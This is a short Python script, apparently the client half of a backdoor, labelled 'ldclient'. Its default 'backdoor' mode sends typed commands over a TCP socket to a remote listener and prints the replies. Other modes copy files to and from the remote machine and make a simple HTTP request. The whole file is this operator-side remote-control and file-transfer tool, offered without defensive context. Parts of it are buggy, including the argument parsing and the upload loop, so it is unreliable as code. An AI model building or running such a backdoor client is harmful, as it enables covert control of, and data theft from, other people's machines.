import socket
import sys
import http.client

s = socket.socket()
port = 0
host = '127.0.0.1'
conntype = "backdoor"
filetotransfer = ""
newfilename = ""
direction = ""
request = ""

for i in range(len(sys.argv)):
    if sys.argv[i] == '-a':
        i+=1
        host = sys.argv[i]
        continue
    if sys.argv[i] == '-p':
        i+=1
        port = int(sys.argv[i])
        continue
    if sys.argv[i] == '-e': # echo
        conntype = "default"
        continue
    if sys.argv[i] == '-tf':
        i+=1
        conntype = "filetransfer"
        if i < len(sys.argv):
            filetotransfer = sys.argv[i]
        else:
            print("ldclient: -tf (transfer-file): Needs File!")
            filetotransfer = input("File Name: ")
        i+=1
        if i < len(sys.argv) and (sys.argv[i] == 'to' or sys.argv[i] == 'from'):
            direction = sys.argv[i]
        else:
            print("ldclient: -tf (transfer-file): Needs Direction!")
            direction  = input("Direction(to/from): ")
        i+=1
        if i < len(sys.argv):
            newfilename = sys.argv[i]
        else:
            print("ldclient: -tf (transfer-file): Need New File Name!")
            newfilename = input("File Name: ")
        continue
    if sys.argv[i] == '-httpreq':
        request = input("HTTP Request: ")
        conntype = "httprequest"
        continue

if conntype == "httprequest":
    req_method = ""
    url = ""
    getting_method = True
    for c in request:
        if c == ' ':
            getting_method = False
        elif not getting_method:
            url+=c
        elif getting_method:
            req_method+=c
    conn = http.client.HTTPConnection(url)
    conn.request(req_method, '/')
    r1 = conn.getresponse()
    print("STATUS:", r1.status, " REASON:", r1.reason)
    print("RESPONSE:\n ", r1.read())
    exit(0)
    
if port == 0:
    print("Needs Port!")
    port = int(input("Port: "))

    
s.connect((host, port))
print(s.recv(2048).decode('utf-8'))
s.send(conntype.encode('utf-8'))
print("You are in " + conntype + " mode") 
 
if conntype == 'default':
    while True:
        msg = input()
        s.send(msg.encode('utf-8'))
        print(s.recv(8192).decode('utf-8'))
        if msg == "exit":
            break;
if conntype == 'backdoor':
    while True:
        msg = input()
        s.send(msg.encode('utf-8'))
        print(s.recv(8192).decode('utf-8'))
        if msg == "exit":
            print("ldclient: exiting!")
            break;
elif conntype == 'filetransfer':
    s.recv(50)
    s.send(newfilename.encode('utf-8'))
    s.recv(50)
    s.send(direction.encode('utf-8'))
    while True:
        if direction == 'to':
            print(s.recv(2048).decode('utf-8'))
            with open(filetotransfer) as file:
                fstr = file.read(2048)
                s.send(fstr.encode('utf-8'))
                recieved = s.recv(2048).decode('utf-8')
                if len(fstr) < 2048:
                    break
        elif direction == 'from':
            s.send("file".encode('utf-8'))
            with open(filetotransfer, "a") as file:
                msg = s.recv(2048)
                print("WRITING TO FILE: ")
                print("CONTENTS: " + msg.decode('utf-8'))
                file.write(msg.decode('utf-8'))
                s.send(("Written " + str(len(msg)) + " to file " + filetotransfer).encode('utf-8'))

    print("ldclient: exiting!")
    s.send("exit".encode('utf-8'))

s.close()
